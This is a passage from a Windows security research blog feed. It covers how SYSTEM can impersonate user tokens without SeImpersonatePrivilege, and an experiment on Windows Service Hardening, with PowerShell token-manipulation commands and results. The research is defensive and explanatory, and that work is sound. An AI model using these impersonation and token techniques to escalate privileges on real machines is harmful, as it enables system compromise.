/></span>On my machine that lists 22 services which are super secure and don't have <i>SeImpersonatePrivilege </i>configured. Of course the SYSTEM user is so powerful that surely it doesn't matter whether they have <i>SeImpersonatePrivilege </i>or not. You'd be right but it might surprise you to learn that for the most part SYSTEM doesn't need <i>SeImpersonatePrivilege </i>to impersonate (almost) any user on the computer.<br /><br />Let's see a diagram for the checks to determine if you're allowed to impersonate a Token. You might know it if you've seen any of my presentations, or read part 3 of <a href=\"https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html\">Reading Your Way Around UAC</a>.<br /><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://1.bp.blogspot.com/-7LZ_TQrrc0Q/XjJwEJpq_rI/AAAAAAAAEKs/Ir_m0sWGrJo59UMV1a8oGrYVRn-XJ1vZACLcBGAsYHQ/s1600/Assign%2BImpersonation%2BToken.png\" style=\"margin-left: 1em; margin-right: 1em;\"><img alt=\"Impersonation FlowChat. Showing that there's an Origin Session Check.\" border=\"0\" height=\"332\" src=\"https://1.bp.blogspot.com/-7LZ_TQrrc0Q/XjJwEJpq_rI/AAAAAAAAEKs/Ir_m0sWGrJo59UMV1a8oGrYVRn-XJ1vZACLcBGAsYHQ/s640/Assign%2BImpersonation%2BToken.png\" title=\"\" width=\"640\" /></a></div><br />Actually this diagram isn't exactly like I've shown before I changed one of the boxes. Between the IL check and the User check I've added a box for \"Origin Session Check\". I've never bothered to put this in before as it didn't seem that important in the grand scheme. In the kernel call&nbsp;<i>SeTokenCanImpersonate </i>the check looks basically like:<br /><br /><span>if (proctoken-&gt;AuthenticationId ==&nbsp;</span><br /><span>&nbsp; &nbsp; imptoken-&gt;OriginatingLogonSession) {</span><br /><span><span style=\"white-space: pre;\"> </span>return STATUS_SUCCESS;</span><br /><span>}</span><br /><br />The check is therefore, if the current Process Token's Authentication ID matches the Impersonation Token's OriginatingLogonSession ID then allow impersonation. Where is&nbsp;<i>OriginatingLogonSession</i> coming from? The value is set when an API such as <i>LogonUser </i>is used, and is set to the Authentication ID of the Token calling the API. This check allows a user to&nbsp;get back a Token and impersonate it even if it's a different user which would normally be blocked by the user check. Now what Token authenticates all new users? SYSTEM does, therefore almost every Token on the system has an&nbsp;<i>OriginatingLogonSession</i> value set to the Authentication ID of the SYSTEM user.<br /><br />Not convinced? We can test it from an admin PS shell. First create a SYSTEM PS shell from an Administrator PS shell using:<br /><br /><span>PS&gt; Start-Win32ChildProcess powershell</span><br /><br />Now in the SYSTEM PS shell check the current Token's Authentication ID (yes I know <i>Pseduo </i>is a typo ;-)).<br /><br /><span>PS&gt;&nbsp;$(Get-NtToken -Pseduo).AuthenticationId</span><br /><span><br /></span><span>LowPart HighPart</span><br /><span>------- --------</span><br /><span>&nbsp; &nbsp; 999&nbsp; &nbsp; &nbsp; &nbsp; 0</span><br /><br />Next remove&nbsp;<i>SeImpersonatePrivilege&nbsp;</i>from the Token:<br /><br /><span>PS&gt; Remove-NtTokenPrivilege SeImpersonatePrivilege</span><br /><br />Now pick a normal user token, say from Explorer and dump the Origin.<br /><br /><span>PS&gt; $p = Get-NtProcess -Name explorer.exe</span><br /><span>PS&gt; $t = Get-NtToken -Process $p -Duplicate</span><br /><span>PS&gt; $t.Origin</span><br /><span><br /></span><span>LowPart HighPart</span><br /><span>------- --------</span><br /><span>&nbsp; &nbsp; 999&nbsp; &nbsp; &nbsp; &nbsp; 0</span><br /><br />As we can see the Origin matches the SYSTEM Authentication ID. Now try and impersonate the Token and check what the resultant impersonation level assigned was:<br /><br /><span>PS&gt; Invoke-NtToken $t {$(Get-NtToken -Impersonation -Pseduo).ImpersonationLevel}</span><br /><span>Impersonation</span><br /><br />We can see the final line shows the impersonation level as <i>Impersonation</i>. If we'd been blocked impersonating the Token it'd be set to <i>Identification</i> level instead.<br /><br />If you think I've made a mistake we can force failure by trying to impersonate a SYSTEM token but at a higher IL. Run the following to duplicate a copy of the current token, reduce IL to High then test the impersonation level.<br /><br /><span>PS&gt; $t = Get-NtToken -Duplicate</span><br /><span>PS&gt; Set-NtTokenIntegrityLevel High</span><br /><span>PS&gt; Invoke-NtToken $t {$(Get-NtToken -Impersonation -Pseduo).ImpersonationLevel}</span><br /><span>Identification</span><br /><br />As we can see, the level has been set to <i>Identification</i>. If <i>SeImpersonatePrivilege </i>was being granted we'd have been able to impersonate the higher IL token as the privilege check is before the IL check.<br /><br />Is this ever useful? One place it might come in handy is if someone tries to sandbox the SYSTEM user in some way. As long as you meet all the requirements up to the Origin Session Check, especially IL, then you can still impersonate other users even if that's been stripped away. This should work even in AppContainers or Restricted as the check for sandbox tokens happens after the session check.<br /><br />The take away from this blog should be:<br /><br /><ul><li>Removing <i>SeImpersonatePrivilege </i>from SYSTEM services is basically pointless.</li><li>Never try create a sandboxed process which uses SYSTEM as the base token as you can probably circumvent all manner of security checks including impersonation.</li></ul><br /><br /><br />", "links": [{"rel": "edit", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/4142065737038055721"}, {"rel": "self", "type": "application/atom+xml", "href": "https://www.blogger.com/feeds/4304739697716191998/posts/default/4142065737038055721"}, {"rel": "alternate", "type": "text/html", "href": "https://www.tiraniddo.dev/2020/01/dont-use-system-tokens-for-sandboxing.html", "title": "Don't Use SYSTEM Tokens for Sandboxing (Part 1 of N)"}], "authors": [{"name": "Unknown", "email": "noreply@blogger.com"}], "author_detail": {"name": "Unknown", "email": "noreply@blogger.com"}, "author": "Unknown (noreply@blogger.com)", "gd_image": {"rel": "http://schemas.google.com/g/2005#thumbnail", "width": "16", "height": "16", "src": "https://img1.blogblog.com/img/b16-rounded.gif"}, "media_thumbnail": [{"url": "https://1.bp.blogspot.com/-7LZ_TQrrc0Q/XjJwEJpq_rI/AAAAAAAAEKs/Ir_m0sWGrJo59UMV1a8oGrYVRn-XJ1vZACLcBGAsYHQ/s72-c/Assign%2BImpersonation%2BToken.png", "height": "72", "width": "72"}], "href": ""}, {"id": "tag:blogger.com,1999:blog-4304739697716191998.post-1545060922524989337", "guidislink": true, "link": "https://www.tiraniddo.dev/2020/01/empirically-assessing-windows-service.html", "published": "2020-01-01T18:26:00.002-08:00", "published_parsed": [2020, 1, 2, 2, 26, 0, 3, 2, 0], "updated": "2020-05-06T06:44:41.787-07:00", "updated_parsed": [2020, 5, 6, 13, 44, 41, 2, 127, 0], "tags": [{"term": "Service", "scheme": "http://www.blogger.com/atom/ns#", "label": null}, {"term": "Windows", "scheme": "http://www.blogger.com/atom/ns#", "label": null}], "title": "Empirically Assessing Windows Service Hardening", "title_detail": {"type": "text/plain", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "Empirically Assessing Windows Service Hardening"}, "content": [{"type": "text/html", "language": null, "base": "https://www.tiraniddo.dev/feeds/posts/default", "value": "In the past few years there's been numerous exploits for service to system privilege escalation. Primarily they revolve around the fact that system services typically have impersonation privilege. What this means is given access to a suitable token handle of an administrator (say through the <a href=\"https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/\">Rotten Potato</a> attack) you can impersonate and elevate from a lower-privileged service account to SYSTEM. The problem for discovers of these attacks is that Microsoft do not consider them something which needs to be fixed with a security bulletin, as having <i>SeImpersonatePrivilege</i> is basically a massive security hole. However MS go and <a href=\"https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/\">fix them silently</a>&nbsp;making it unclear if they care or not.<br /><br />Of course, none of this is really new,&nbsp;<a href=\"https://twitter.com/cesarcer\">Cesar Cerrudo</a> detailed these sorts of service attacks in <a href=\"https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf\">Token Kidnapping</a> and <a href=\"https://www.defcon.org/images/defcon-18/dc-18-presentations/Cerrudo/DEFCON-18-Cerrudo-Token-Kidnapping-Revenge.pdf\">Token Kidnapping's Revenge</a>. The novel element recently is how to get hold of the access token, for example via negotiating local NTLM authentication. Microsoft seem to have been fighting this fire for almost 10 years and still have not gotten it right. In shades of UAC, a significant security push to make services more isolated and secure has been basically abandoned because (presumably) MS realized it was an indefensible boundary.<br /><br />That's not to say there hasn't been interesting service account to SYSTEM bugs which Microsoft have fixed. The most recent example is&nbsp;<a href=\"https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1322\">CVE-2019-1322</a> which was independently discovered by multiple parties (<a href=\"https://twitter.com/donkeysteam\">DonkeysTeam</a>,&nbsp;<a href=\"https://twitter.com/gweeperx\">Ilias Dimopoulos</a> and&nbsp;Edward Torkington/Phillip Langlois of NCC). To understand the bug you probably should read up one of the write-ups (<a href=\"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/\">NCC one here</a>) but the gist is, the Update Orchestrator Service has a service security descriptor which allowed \"NT AUTHORITY\\SERVICE\" full access. It so happens that all system services, including lower-privileged ones have this group and so you could reconfigure the service (which was running as SYSTEM) to point to any other binary giving a direct service to SYSTEM privilege escalation.<br /><br />That begs the question, why was CVE-2019-1322 special enough to be fixed and not issues related to impersonation? Perhaps it's because this issue didn't rely on impersonate privileges being present? It is possible to configure services to not have impersonate privilege, so presumably if you could go from a non-impersonate service to an impersonate service that would count as a boundary? Again probably not, for example&nbsp;<a href=\"https://twitter.com/itm4n/status/1202638656063901696\">this bug</a>&nbsp;which abuses the scheduled task service to regain impersonate privilege wouldn't likely be fixed by Microsoft.<br /><br />That lack of clarity is why I <a href=\"https://twitter.com/tiraniddo/status/1203068543765368832\">tweeted</a> to <a href=\"https://twitter.com/n0x08\">Nate Warfield</a> and ultimately to <a href=\"https://twitter.com/epakskape\">Matt Miller</a> asking for some advice with respect to the <a href=\"https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria\">MSRC Security Servicing Guidelines</a>. The result is, even if the service doesn't have impersonate privilege it wouldn't be a defended boundary if all you get is the same user with additional privileges as you can't block yourself from compromising yourself. This is the UAC argument over again, but IMO there's a crucial difference, <a href=\"https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/WS2008-Windows-Service-Hardening/ba-p/372702\">Windows Service Hardening</a>&nbsp;(WSH) was supposed to fix this problem for us in Vista. Unsurprisingly&nbsp;Cesar Cerrudo also did a <a href=\"https://downloads.immunityinc.com/infiltrate-archives/WindowsServicesHacking.pdf\">presentation</a> about this at the inaugural (maybe?) <a href=\"https://infiltratecon.com/info/archives.html#archive-year-2011\">Infiltrate in 2011</a>.<br /><br />The question I had was, is WSH still as broken as it was in 2011? Has anything changed which made WSH finally live up to its goal of making a service compromise not equal to a full system compromise? To determine that I thought I'd run an experiment on Windows 10 1909. I'm only interested in the features which WSH touches which led me to the following hypothesis:<br /><br /><blockquote class=\"tr_bq\"><i><b>\"Under Windows Service Hardening one service without impersonate privilege can't write to the resources of another service which does have the privilege, even if the same user, preventing full system compromise.\"</b></i></blockquote><i><b><br /></b></i>The hypothesis makes the assumption that if you can write to another service's resources then it's possible to compromise that other service. If that other service has <i>SeImpersonatePrivilege</i> then that inevitably leads to full system compromise. Of course that's not necessarily the case, the resource being written to might be uninteresting, however as a proxy this is sufficient as the goal of WSH is to prevent one service modifying the data of another even though they are the same underlying user.<br /><br /><h3>WSH Details</h3>Before going into more depth on the experiment, let's quickly go through the various features of WSH and how they're expressed. If you know all this you can skip to the description of the experiment and the results.<br /><br /><h4>Limited Service Accounts and Reduced Privilege</h4><div>This feature is by far the oldest attempt to harden services, the introduction of the LOCAL SERVICE (LS) and NETWORK SERVICE (NS) accounts. Prior to the accounts introduction there was only two ways of configuring the user for a system service on Windows, either the fully privileged SYSTEM account or creating a local/domain user which has the \"<a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/log-on-as-a-service\">Log on as a Service</a>\" right. The two accounts where introduced in XP SP2 (I believe) after worms such as <a href=\"https://en.wikipedia.org/wiki/Blaster_(computer_worm)\">Blaster</a> basically got SYSTEM privilege through remotely attacking exposed services. The two service accounts are not administrator accounts which means they shouldn't be able to directly compromise the system. The accounts are very similar on Windows 10 1909, they are both assigned the following groups*:</div><div><br /></div><div><div><span>BUILTIN\\Users</span></div><div><span>CONSOLE LOGON</span></div><div><span>Everyone</span></div><div><span>LOCAL</span></div><div><span>NT AUTHORITY\\Authenticated Users</span></div><div><span>NT AUTHORITY\\LogonSessionId_X_Y</span></div><div><span>NT AUTHORITY\\SERVICE</span></div><div><span>NT AUTHORITY\\This Organization</span></div></div><div><br /></div><div>* Technically this isn't 100% accurate, on my machine the LS account has some extra capability groups, but we'll ignore those for this blog post.</div><div><br /></div><div>No Administrator group in sight. Each service token gets a unique Logon Session ID SID which will be important later. The service accounts also have a limited set of privileges, as shown below:</div><div><br /></div><div><div><span><b>SeAssignPrimaryTokenPrivilege</b></span></div><div><span>SeAuditPrivilege</span></div><div><span>SeChangeNotifyPrivilege</span></div><div><span>SeCreateGlobalPrivilege</span></div><div><span><b>SeImpersonatePrivilege</b></span></div><div><span>SeIncreaseQuotaPrivilege</span></div><div><span>SeIncreaseWorkingSetPrivilege</span></div><div><span>SeShutdownPrivilege</span></div><div><span>SeSystemTimePrivilege\u2020</span></div><div><span>SeTimeZonePrivilege</span></div><div><span>SeUndockPrivilege</span></div></div><div><br /></div><div>\u2020 NETWORK SERVICE doesn't have <i>SeSystemTimePrivilege</i>.</div><div><br /></div><div>The two privileges I've highlighted, <i>SeAssignPrimaryTokenPrivilege</i> and <i>SeImpersonatePrivilege</i>&nbsp;give these accounts effectively full system access when combined with a suitable privileged token. Part of WSH is also giving control over what privileges the service account actually requires. The default is to allow all privileges, however when configuring a service you can specify a list of privileges to restrict the service to. For example the&nbsp;<i>CDPSvc</i> service is configured to only require <i>SeImpersonatePrivilege</i>. Quite why they bother to put this restriction on the service I don't know \u00af\\_(\u30c4)_/\u00af.</div><div><br />What's the difference between LS and NS? The primary difference is LS has no network credentials, so accessing network resources as that user would only succeed as an anonymous login. NS on the other hand is created with the credentials of the computer account and so can interact with the network for resources allowed by that authentication. This only really matters to domain joined machines, standalone machines would not share the computer account with anyone else.<br /><br /></div><h4>Per-Service SID</h4><div>The first big addition in WSH was the Per-Service SID. This SID is automatically added to the group list of default groups shown previously by the SCM when creating the service's primary token. The service SID is also added with the&nbsp;SE_GROUP_OWNER flag set and is not mandatory, which means it can be set as the token's default owner when creating new resources and it can disabled. The basic idea is a service can ACL its resources to this SID to prevent other services from accessing them. The use of a service SID is optional, but the majority of default services are configured to use it. An example SID for <i>CDPSvc </i>is as follows:</div><div><br /></div><div><span>S-1-5-80-3433512109-503559027-1389316256-1766580070-2256751264</span></div><div><br /></div><div>The SID is derived by generating a SHA1 hash of the service name and adding that as the SID's RIDs (with an extra 80 at the start to signify it's a service SID). The use of a hash should make it extremely unlikely two services would generate the same SID.</div><div><br /></div><div>Of course it's up to the service to actually ACL their resources appropriately. To aid in that the token's default DACL is also configured to the following (for <i>CDPSvc</i>):</div><div><br /></div><div><div><span>- Type&nbsp; : Allowed</span></div><div><span>- Name&nbsp; : NT AUTHORITY\\SYSTEM</span></div><div><span>- Access: Full Access</span></div><div><span><br /></span></div><div><span>- Type&nbsp; : Allowed</span></div><div><span>- Name&nbsp; : OWNER RIGHTS</span></div><div><span>- Access: ReadControl</span></div><div><span><br /></span></div><div><span>- Type&nbsp; : Allowed</span></div><div><span>- Name&nbsp; : NT SERVICE\\CDPSvc</span></div><div><span>- Access: Full Access</span></div></div><div><br /></div><div>The three entries grant SYSTEM and the service SID full access to any resources with this DACL. It then limits the owner of the resource through OWNER RIGHTS to only READ_CONTROL access. This directly prevents one service account accessing the resources of another for write access. Unfortunately the default DACL is only applied when there's no other access control specified, either explicitly at creation time or due to inheritance.&nbsp;</div><div><br /></div><div>One other thing to point out is that Windows still has shared services through the use of SVCHOST. If multiple services are registered in a specific SVCHOST instance then the SCM will create the token with all service SIDs in the group list and default DACL even if a service isn't currently loaded in the host. That has become less of an issue since <a href=\"https://docs.microsoft.com/en-us/windows/application-management/svchost-service-refactoring\">Windows 1703</a>, as long as you have greater that 3.5GB of RAM services will run in separate SVCHOST instances and all services will be totally separate.</div><div><br /></div><h4>Write-Restricted Token</h4><div>The second big addition to WSH was the concept of Write-Restricted (WR) tokens. Restricted token's have existed since Windows 2000 and are created using the <i>NtFilterToken</i> system call. The basic concept is the token can have a list of additional groups which are consulted when ever an access check is performed. First the access check is run on the default group list, if access would be granted the access check is run again on the restricted SIDs. If the second check is successful then the access check passes, if not access is denied.&nbsp;</div><div><br /></div><div>Restricted tokens are used for sandboxing (such as in Chrome) but are difficult to setup correctly as it blocks all access equally including reading critical files on disk. WR tokens solve the access problem by only blocking write access but leaving read and execute access alone.&nbsp;</div><div><br /></div><div>In order for a service configured as WR to write to a resource the associated security descriptor must contain the required access for one of the following restricted SIDs.</div><div><br /></div><div><div><span>Everyone</span></div><div><span>NT AUTHORITY\\LogonSessionId_X_Y</span></div><div><span>NT AUTHORITY\\WRITE RESTRICTED</span></div><div><span>NT SERVICE\\SERVICE_NAME</span></div></div><div><br /></div><div>The WRITE RESTRICTED SID is a special group SID which resources can apply if they expect a service to write to the resource. This SID is also added to the token's groups by the SCM so that it can be used to pass both checks. By combining service SIDs and WR the amount of resources a service can modify should be significantly reduced.<br /><br /></div><h4>And the Rest</h4><div>There's a few things which are technically part of service hardening which won't really consider for the experiment:</div><div><br /></div><div>The main one is <a href=\"https://blogs.technet.microsoft.com/voy/2007/04/02/network-restrictions-for-service-hardening/\">additional rules in the firewall</a> to block network services or requests being made from a service. This is arguably more to prevent remote compromise than it is to prevent cross-service attacks.&nbsp;</div><div><br /></div><div>Another is <a href=\"https://blogs.technet.microsoft.com/voy/2007/02/23/services-isolation-in-session-0-of-windows-vista-and-longhorn-server/\">Session 0 Isolation</a> and System Integrity Level. Session 0 Isolation was introduced to prevent Shatter Attacks, by preventing any windows being created by a service on the same desktop as a normal user. System Integrity Level through <a href=\"https://en.wikipedia.org/wiki/User_Interface_Privilege_Isolation\">UIPI</a> then prevents attacks even if the service did create a window on a normal user desktop as it'd be at a much higher IL (even than Administrators). The System IL does admittedly also have a security access check function but it's not that important for cross-service attacks.</div><div><br /></div><h3>Experiment Procedure</h3><div>On to the experiment itself. Based on the hypothesis I presented earlier the goal is to determine if you can write to resources of one service from another service even though they're the same user. To make this testable I decided on the following procedure:<br /><br />Step 1: Build an access token for a service which doesn't exist on the system.<br />Step 2: Enumerate all resources of a specific type which are owned by the token owner and perform an access check using the token.<br />Step 3: Collate the results based on the type of resource and whether write access was granted.<br /><br />The reason for choosing to build a token for a non-existent service is it ensures we should only see the resources that could be shared by other services as the same user, not any resources which are actually designed to be accessible by being created by a service. These steps need to be repeated for different access tokens, we'll use the following five:<br /><ul><li>LOCAL SERVICE</li><li>LOCAL SERVICE, Write Restricted</li><li>NETWORK SERVICE</li><li>NETWORK SERVICE, Write Restricted</li><li>Control</li></ul><div>We'll test both normal service SID and WR versions of the access token to see if it makes much of a difference. One thing to determine is what to use as a control. Ideally the control would be another service account with WSH disabled. However I couldn't find a way to disable WSH entirely to do this test, so instead we need some other control. If our hypothesis holds and WSH is effective we'd expect no resources to be writable, therefore we need to pick a control account where we know this is not true. The easiest is just to use the current logged on user account, it should be able to access almost all its own resources.</div><div><br /></div><div>What resources do we want to inspect? The obvious type is Process/Thread resources. Getting write access to either of these in another service is probably a trivial to get full system compromise through impersonate. We'd want to get a bigger picture however, it'd be useful to include Files, Registry keys and Named Kernel Objects. These resources might not directly lead to compromise but it does give us a general idea of the maximum impact.&nbsp;</div><div><br /></div><div>It's worth noting that the hypothesis made a point to specify writing to the resources of a service which has impersonate privilege from one which does not. However this experimental process will only base the analysis on whether the resource is owned by the service user. This is intentional, it'd be too complex to attribute the resource to a specific service in all cases. However an assumption is made that more services running as a specific user have impersonate privilege than do not, therefore in all probability any resource you can write to is probably owned by one of them. We could verify that assumption if we liked, but I'll probably not.</div><div><br /></div><div>Finally, a good experiment should be something which can be repeatable and verifiable. To that end I'll provide all the code necessary to perform the steps, written in PowerShell and using my <i>NtObjectManager</i> module. If you want to re-run the experiment you should be able to do so and produce a very similar set of results.</div></div><br /><h3>Experiment Procedure Detail</h3>On to specific PowerShell steps to perform the experiment. First off you'll need my <a href=\"https://www.powershellgallery.com/packages/NtObjectManager\">NtObjectManager</a> module, specifically at least version 1.1.25 as I've added a few extra commands to simplify the process. You will also need to run all the commands as the SYSTEM user, some command will need it (such as getting access tokens) others benefit for the elevated privileges. From an admin command prompt you can create a SYSTEM PowerShell console using the following command:<br /><br /><span>Start-Win32ChildProcess -RequiredPrivilege SeTcbPrivilege,SeBackupPrivilege,SeRestorePrivilege,SeDebugPrivilege powershell</span><br /><br />This command will find a SYSTEM process to create the new process from which also has, at a minimum, the specified list of privileges. Due to the way the process is created it'll also have full access to the current desktop so you can spawn GUI applications running at system if you need them.<br /><br />The experiment will be run on a VM of Windows 1909 Enterprise updated to December 2019 from a split-token admin user account. This just ensures the minimum amount of configuration changes and additional software is present. Of course there's going to be variability on the number of services running at any one time, there's not a lot which can be done about that. However it's expected that the result should be same even if the individual resources available are not. If you were concerned you could rerun the experiment on multiple different installs of Windows at different times of day and aggregate the results.<br /><br /><h4>Creating the Access Tokens</h4><div>We need to create 5 access tokens for the test. Ideally we'd like to create the four service tokens using the exact method used by the SCM. We could register our unknown service and start the service to steal its token. There is also an undocumented&nbsp;<i>RGetServiceProcessToken</i> SCM RPC method in newer versions of Windows 10. However I think creating a service risks some resources being populated with that service's identity which might not be what we really want. Instead we can use <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/logonuserexexw\">LogonUserExExW</a>&nbsp;which is what the SCM uses, with the&nbsp;LOGON32_LOGON_SERVICE type to create LS and NS tokens. This will work as long as we have <i>SeTcbPrivilege</i>. We'll then just add the appropriate groups, convert to WR,&nbsp; and remove privileges as necessary. We can get to the <i>LogonUserExExW</i>&nbsp;API using <i>Get-NtToken. </i>I've wrapped up everything into a function <i>Get-ServiceToken</i>, you can see the full function in the <a href=\"https://gist.github.com/tyranid/1431ec4da18c89cdea34cfe3f3af2bc0#file-wsh_experiment-ps1-L6\">final script</a>. Using this function we can create all the tokens we need using the following commands:</div><div><br /><span>$tokens = @()</span><br /><span>$tokens += Get-ServiceToken LocalService FakeService</span><br /><span>$tokens += Get-ServiceToken LocalService&nbsp;FakeService -WriteRestricted</span><br /><span>$tokens += Get-ServiceToken NetworkService FakeService</span><br /><span>$tokens += Get-ServiceToken NetworkService FakeService -WriteRestricted</span><br /><br />For the control token we'll get the unmodified session access token for the current desktop. Even though we're running as SYSTEM as we're running on the same desktop we can just use the following command:</div><div><br /></div><div><span>$tokens += Get-NtToken -Session -Duplicate</span></div><div><br /><i>Random note. </i>When calling <i>LogonUserExExW</i> and requesting a service SID as an additional group the call will fail with access denied. However this only happens if the service SID is the first NT Authority SID in the additional groups list. Putting any other NT Authority SID, including our new logon session SID before the service SID makes it work. Looking at the code in LSASRV (possibly the function <i>LsapCheckVirtualAccountRestriction</i>) it looks like the use of a service SID should be restricted to the first process (based on its PID) that used a service SID which would be the SCM. However if another NT Authority SID is placed first the checking loop sets a boolean flag which prevents the loop checking any more SIDs and so the service SID is ignored. I've no idea if this is a bug or not, however as you need TCB privilege to set the additional groups I don't think it's a security issue.<br /><br /><h4>Resource Checking and Result Collation</h4></div><div>With the 5 tokens in hand we can progress to assessing accessible resources. The original purpose of my Sandbox Analysis tools was finding accessible resources from a sandbox process, however the same code is capable of finding resources accessible from any access token, including service tokens.</div><div><br /></div><div>First as way of example lets run checks for process and threads:</div><div><br /></div><div><div><span>$ps = Get-AccessibleProcess -Tokens $tokens `</span></div><div><span>&nbsp; &nbsp; -CheckMode ProcessOnly -AllowEmptyAccess</span></div><div><span>$ts = Get-AccessibleProcess -Tokens $tokens `</span></div><div><span>&nbsp; &nbsp; -CheckMode ThreadOnly -AllowEmptyAccess</span></div></div><div><br /></div><div>We can pass a list of tokens to the checking command, this improves performance as we only do the enumeration of resources for every token group then do the access check. Each generated access result has a <i>TokenId</i> property which indicates the unique ID of the token which was used for the check, this allows us to extract the correct results later. We also specify the <i>AllowEmptyAccess</i> option, which will generate a result even if the access check fails and the token has no access to the resource. This will be useful to allow us to assess what resources are owned by the token's owner SID but we were not granted access.</div><div><br /></div><div>Let's do the rest of the resources:</div><div><br /></div><div><div><span>$os = Get-AccessibleObject \\ -Recurse `</span></div><div><span>&nbsp; &nbsp; -Tokens $tokens -AllowEmptyAccess</span></div></div><div><div><span>$fs = Get-AccessibleFile -Win32Path \"$env:SystemDrive\\\" `</span></div><div><span>&nbsp; &nbsp; -FormatWin32Path -</span><span>Recurse -Tokens $tokens -AllowEmptyAccess</span></div><div><span>$ks = Get-AccessibleKey \\Registry -FormatWin32Path -Recurse `</span></div><div><span>&nbsp; &nbsp; -Tokens $tokens -AllowEmptyAccess</span></div></div><div><br /></div><div>We'll only get the accessible files on the system drive in this case as that'll be the only drive in the VM. Note that <i>Get-AccessibleObject</i> doesn't check ALPC ports, it's not possible to open an ALPC port by name and read its security descriptor. We'll ignore ALPC ports for this experiment, as it's probably worthy of a topic all on its own.</div><div><br /></div><div>We now have all the results we need in five variables along with the tokens. If you want to run it yourself the final script is on Github <a href=\"https://gist.github.com/tyranid/1431ec4da18c89cdea34cfe3f3af2bc0\">here</a>. It'll take a fair amount of time to run but once it's complete you'll find 5 CSV files in the current directory containing the results for each token.<br /><br /></div><h3>Experiment Results</h3>We now need to do our basic analysis of the results. Let's start with calculating the percentage of writable resources for each token type relative to the total number of resources. From my single experiment run I got the following table:<br /><br /><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" dir=\"ltr\" style=\"border-collapse: collapse; border: none; font-family: Arial; font-size: 10pt; width: 0px;\"><colgroup><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /><col width=\"100\" /></colgroup><tbody><tr style=\"height: 21px;\"><td style=\"background-color: white; border: 1px solid rgb(0, 0, 0); overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Token</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Writable</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Writable (WR)</td><td style=\"background-color: #d9d9d9; border-color: rgb(0, 0, 0) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Total</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Control</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">99.83%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">N/A</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">13171</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Network Service</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">65.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.00%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">300</td></tr><tr style=\"height: 21px;\"><td style=\"background-color: #d9d9d9; border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; vertical-align: bottom;\">Local Service</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">62.89%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">0.70%</td><td style=\"border-color: rgb(204, 204, 204) rgb(0, 0, 0) rgb(0, 0, 0) rgb(204, 204, 204); border-style: solid; border-width: 1px; overflow: hidden; padding: 2px 3px; text-align: right; vertical-align: bottom;\">574</td></tr></tbody></table><br />As we expected the control token had almost 100% of the owned resources writable by the user.&nbsp; However for the two service accounts both had over 60% of their owned resources writable when using an unrestricted token. That level is almost completely eliminated when using a 